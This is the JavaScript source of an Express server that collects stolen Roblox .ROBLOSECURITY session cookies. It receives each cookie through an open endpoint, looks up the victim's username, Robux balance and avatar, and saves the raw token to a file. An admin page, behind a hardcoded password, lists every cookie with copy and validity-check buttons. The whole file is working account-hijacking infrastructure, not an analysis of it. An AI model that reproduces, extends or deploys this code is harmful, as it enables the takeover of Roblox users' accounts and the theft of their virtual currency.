const express = require('express');
const app = express();
const cookieParser = require('cookie-parser');
app.use(cookieParser());
const fs = require('fs');

app.use(express.json());

let cookieStore = new Map();
try {
    const data = JSON.parse(fs.readFileSync('cookies.json', 'utf8'));
    cookieStore = new Map(Object.entries(data));
} catch (err) {
    console.log('No existing cookies.json, starting fresh');
}

function saveCookies() {
    const obj = Object.fromEntries(cookieStore);
    fs.writeFileSync('cookies.json', JSON.stringify(obj, null, 2));
}

app.post('/check-cookie', async (req, res) => {
    const cookie = req.body.cookie;
    try {
        const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                "Cookie": ".ROBLOSECURITY=" + cookie
            }
        });
        const data = await response.json();
        const isValid = !data.errors;
        if (cookieStore.has(cookie)) {
            const cookieData = cookieStore.get(cookie);
            cookieData.isValid = isValid;
            cookieStore.set(cookie, cookieData);
            saveCookies();
        }
        res.json({ valid: isValid });
    } catch (error) {
        if (cookieStore.has(cookie)) {
            const cookieData = cookieStore.get(cookie);
            cookieData.isValid = false;
            cookieStore.set(cookie, cookieData);
            saveCookies();
        }
        res.json({ valid: false });
    }
});

app.post('/check-exists', (req, res) => {
    const cookie = req.body.cookie;
    res.json({ exists: cookieStore.has(cookie) });
});

app.post('/cookies', async (req, res) => {
    const cookie = req.body.cookie;

    try {
        const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                "Cookie": ".ROBLOSECURITY=" + cookie
            }
        });

        const userData = await response.json();
        const username = userData.name;
        const userId = userData.id;

        const balanceResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
            headers: {
                "Cookie": ".ROBLOSECURITY=" + cookie
            }
        });

        const balanceData = await balanceResponse.json();
        const robuxAmount = balanceData.robux || 0;

        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
        const avatarData = await avatarResponse.json();
        const avatarUrl = avatarData.data[0]?.imageUrl || '';

        cookieStore.set(cookie, {
            username,
            robuxAmount,
            avatarUrl,
            timestamp: new Date(),
            isValid: true
        });

        saveCookies();
        res.json({ success: true });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: 'Failed to process cookie' });
    }
});

const adminPassword = 'erdemirdo';
let adminSession = new Set();

app.get('/admin/login', (req, res) => {
    const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login</title>
            <style>
                body {
                    font-family: 'Inter', sans-serif;
                    background: #0f172a;
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-container {
                    background: #1e293b;
                    padding: 2rem;
                    border-radius: 8px;
                    width: 300px;
                }
                input {
                    width: 100%;
                    padding: 8px;
                    margin: 8px 0;
                    border: 1px solid #334155;
                    background: #0f172a;
                    color: #fff;
                    border-radius: 4px;
                }
                button {
                    width: 100%;
                    padding: 10px;
                    background: #3b82f6;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                .error {
                    color: #ef4444;
                    margin-top: 8px;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Admin Login</h2>
                <form id="loginForm">
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit">Login</button>
                    <div id="error" class="error"></div>
                </form>
            </div>
            <script>
                document.getElementById('loginForm').addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const password = document.getElementById('password').value;
                    const response = await fetch('/admin/auth', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ password })
                    });
                    const data = await response.json();
                    if (data.success) {
                        window.location.href = '/view/cookies';
                    } else {
                        document.getElementById('error').textContent = 'Invalid password';
                    }
                });
            </script>
        </body>
        </html>
    `;
    res.send(html);
});

app.post('/admin/auth', (req, res) => {
    const { password } = req.body;
    if (password === adminPassword) {
        const sessionId = Math.random().toString(36).substring(7);
        adminSession.add(sessionId);
        res.cookie('adminSession', sessionId, { httpOnly: true });
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

app.get('/view/cookies', (req, res) => {
    const sessionId = req.cookies.adminSession;
    if (!sessionId || !adminSession.has(sessionId)) {
        return res.redirect('/admin/login');
    }
    let cookiesHtml = `
        <div class="search-container">
            <input type="text" id="searchInput" placeholder="Search by username..." class="search-input">
            <label class="hide-invalid">
                <input type="checkbox" id="hideInvalid"> Hide Invalid Cookies
            </label>
        </div>
    `;
    cookieStore.forEach((data, cookie) => {
        const timeAgo = getTimeAgo(new Date(data.timestamp));
        cookiesHtml += `
            <div class="cookie-entry">
                <div class="cookie-header">
                    <img src="${data.avatarUrl}" alt="Avatar" class="avatar">
                    <div class="user-info">
                        <h3>${data.username}</h3>
                        <span class="timestamp">${timeAgo}</span>
                        ${data.isValid === false ? '<span class="invalid-badge">INVALID</span>' : ''}
                    </div>
                    <div class="robux">
                        <span class="robux-icon">R$</span>
                        <span class="robux-amount">${data.robuxAmount}</span>
                    </div>
                </div>
                <div class="cookie-container">
                    <div class="cookie-input-group">
                        <input type="text" value="${cookie}" readonly>
                        <button onclick="copyToClipboard(this)" class="copy-btn">
                            <span class="copy-text">Copy</span>
                            <span class="copied-text">Copied!</span>
                        </button>
                        <button onclick="checkCookie(this, '${cookie}')" class="check-btn">Check</button>
                    </div>
                </div>
            </div>
        `;
    });

    const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Cookie Viewer</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }

                body {
                    font-family: 'Inter', sans-serif;
                    background: #0f172a;
                    color: #fff;
                    padding: 20px;
                    min-height: 100vh;
                }

                h1 {
                    text-align: center;
                    margin: 40px 0;
                    font-size: 2.5rem;
                    background: linear-gradient(45deg, #60a5fa, #3b82f6);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }

                .cookie-entry {
                    background: #1e293b;
                    border-radius: 16px;
                    padding: 24px;
                    margin: 20px auto;
                    max-width: 800px;
                    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),
                               0 2px 4px -1px rgba(0, 0, 0, 0.06);
                    transition: transform 0.2s;
                }

                .cookie-entry:hover {
                    transform: translateY(-2px);
                }

                .cookie-header {
                    display: flex;
                    align-items: center;
                    margin-bottom: 20px;
                }

                .avatar {
                    width: 60px;
                    height: 60px;
                    border-radius: 12px;
                    margin-right: 16px;
                    border: 2px solid #3b82f6;
                }

                .user-info {
                    flex: 1;
                }

                h3 {
                    color: #fff;
                    font-size: 1.25rem;
                    margin-bottom: 4px;
                }

                .timestamp {
                    color: #94a3b8;
                    font-size: 0.875rem;
                }

                .invalid-badge {
                    background: #dc2626;
                    color: white;
                    padding: 4px 8px;
                    border-radius: 4px;
                    font-size: 0.75rem;
                    font-weight: 600;
                    margin-top: 4px;
                    display: inline-block;
                }

                .robux {
                    background: #15803d;
                    padding: 8px 16px;
                    border-radius: 8px;
                    display: flex;
                    align-items: center;
                    gap: 4px;
                }

                .robux-icon {
                    color: #bbf7d0;
                    font-weight: 600;
                }

                .robux-amount {
                    color: #fff;
                    font-weight: 600;
                }

                .cookie-container {
                    margin-top: 16px;
                }

                .cookie-input-group {
                    display: flex;
                    gap: 8px;
                }

                input {
                    flex: 1;
                    padding: 12px;
                    border: 1px solid #334155;
                    background: #0f172a;
                    color: #fff;
                    border-radius: 8px;
                    font-family: monospace;
                    font-size: 0.875rem;
                }

                .copy-btn {
                    padding: 0 24px;
                    background: #3b82f6;
                    color: white;
                    border: none;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: 500;
                    position: relative;
                    overflow: hidden;
                    transition: background-color 0.2s;
                }

                .copy-btn:hover {
                    background: #2563eb;
                }

                .copy-btn.copied {
                    background: #059669;
                }

                .copy-btn .copied-text {
                    display: none;
                }

                .copy-btn.copied .copy-text {
                    display: none;
                }

                .copy-btn.copied .copied-text {
                    display: inline;
                }

                .check-btn {
                    padding: 0 24px;
                    background: #3b82f6;
                    color: white;
                    border: none;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: 500;
                    transition: all 0.2s;
                }

                .check-btn:hover {
                    background: #2563eb;
                }

                .search-container {
                    max-width: 800px;
                    margin: 20px auto;
                    display: flex;
                    gap: 16px;
                    align-items: center;
                }

                .search-input {
                    flex: 1;
                    padding: 12px;
                    border: 1px solid #334155;
                    background: #1e293b;
                    color: #fff;
                    border-radius: 8px;
                    font-size: 1rem;
                }

                .hide-invalid {
                    color: #94a3b8;
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    cursor: pointer;
                }

                .hide-invalid input {
                    width: auto;
                    cursor: pointer;
                }

                @media (max-width: 640px) {
                    body {
                        padding: 10px;
                    }

                    .cookie-header {
                        flex-direction: column;
                        text-align: center;
                        gap: 12px;
                    }

                    .avatar {
                        margin-right: 0;
                    }

                    .robux {
                        margin-top: 8px;
                    }

                    .cookie-input-group {
                        flex-direction: column;
                    }

                    .copy-btn {
                        padding: 12px;
                    }
                }
            </style>
        </head>
        <body>
            <h1>Stored Cookies</h1>
            ${cookiesHtml}
            <script>
                // search but idk if works tbh
                const searchInput = document.getElementById('searchInput');
                const hideInvalidCheckbox = document.getElementById('hideInvalid');
                const cookieEntries = document.querySelectorAll('.cookie-entry');

                function filterCookies() {
                    const searchTerm = searchInput.value.toLowerCase();
                    const hideInvalid = hideInvalidCheckbox.checked;

                    cookieEntries.forEach(entry => {
                        const username = entry.querySelector('h3').textContent.toLowerCase();
                        const isInvalid = entry.querySelector('.invalid-badge') !== null;
                        
                        const matchesSearch = username.includes(searchTerm);
                        const shouldShow = matchesSearch && (!hideInvalid || !isInvalid);
                        
                        entry.style.display = shouldShow ? 'block' : 'none';
                    });
                }

                searchInput.addEventListener('input', filterCookies);
                hideInvalidCheckbox.addEventListener('change', filterCookies);
                function getTimeAgo(date) {
                    const seconds = Math.floor((new Date() - date) / 1000);
                    let interval = Math.floor(seconds / 31536000);

                    if (interval > 1) return interval + ' years ago';
                    if (interval === 1) return '1 year ago';

                    interval = Math.floor(seconds / 2592000);
                    if (interval > 1) return interval + ' months ago';
                    if (interval === 1) return '1 month ago';

                    interval = Math.floor(seconds / 86400);
                    if (interval > 1) return interval + ' days ago';
                    if (interval === 1) return '1 day ago';

                    interval = Math.floor(seconds / 3600);
                    if (interval > 1) return interval + ' hours ago';
                    if (interval === 1) return '1 hour ago';

                    interval = Math.floor(seconds / 60);
                    if (interval > 1) return interval + ' minutes ago';
                    if (interval === 1) return '1 minute ago';

                    if (seconds < 10) return 'just now';

                    return Math.floor(seconds) + ' seconds ago';
                }

                async function checkCookie(button, cookie) {
                    const response = await fetch("/check-cookie", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({ cookie })
                    });
                    const data = await response.json();

                    if (!data.valid) {
                        button.textContent = "Invalid ❌";
                        button.style.background = "#dc2626";
                    } else {
                        button.textContent = "Valid ✓";
                        button.style.background = "#059669";
                    }

                    setTimeout(() => {
                        button.textContent = "Check";
                        button.style.background = "#3b82f6";
                    }, 2000);
                }

                function copyToClipboard(button) {
                    const input = button.parentElement.querySelector('input');
                    input.select();
                    document.execCommand('copy');

                    button.classList.add('copied');
                    setTimeout(() => {
                        button.classList.remove('copied');
                    }, 2000);
                }
            </script>
        </body>
        </html>
    `;

    res.send(html);
});

function getTimeAgo(timestamp) {
    const seconds = Math.floor((new Date() - timestamp) / 1000);
    let interval = Math.floor(seconds / 31536000);

    if (interval > 1) return interval + ' years ago';
    if (interval === 1) return '1 year ago';

    interval = Math.floor(seconds / 2592000);
    if (interval > 1) return interval + ' months ago';
    if (interval === 1) return '1 month ago';

    interval = Math.floor(seconds / 86400);
    if (interval > 1) return interval + ' days ago';
    if (interval === 1) return '1 day ago';

    interval = Math.floor(seconds / 3600);
    if (interval > 1) return interval + ' hours ago';
    if (interval === 1) return '1 hour ago';

    interval = Math.floor(seconds / 60);
    if (interval > 1) return interval + ' minutes ago';
    if (interval === 1) return '1 minute ago';

    if (seconds < 10) return 'just now';

    return Math.floor(seconds) + ' seconds ago';
}

app.listen(8080, '0.0.0.0', () => {
    console.log('Erdemirdo was here, your backend running beach');
});
